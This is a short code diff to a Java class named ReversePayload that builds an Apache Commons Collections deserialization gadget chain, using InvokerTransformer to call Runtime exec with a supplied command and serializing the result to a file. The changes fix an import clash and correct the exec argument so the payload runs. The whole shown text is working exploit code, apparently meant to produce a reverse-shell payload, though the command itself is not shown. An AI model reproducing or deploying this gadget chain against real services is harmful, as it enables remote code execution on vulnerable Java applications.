@@ -1,9 +1,9 @@
+import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.functors.InvokerTransformer;
 import org.apache.commons.collections.map.TransformedMap;
 
-import javax.xml.transform.Transformer;
 import java.io.File;
 import java.io.FileOutputStream;
 import java.io.ObjectOutputStream;
@@ -26,7 +26,7 @@ public class ReversePayload  {
                 new InvokerTransformer("invoke", new Class[] { Object.class,
                         Object[].class }, new Object[] { null, new Object[0] }),
                 new InvokerTransformer("exec", new Class[] { String.class },
-                        execArgs), new ConstantTransformer(1) };
+                        new String[]{execArgs}), new ConstantTransformer(1) };
         Transformer transformerChain = new ChainedTransformer(transforms);
         Map innermap = new HashMap();
         innermap.put("value", "value");
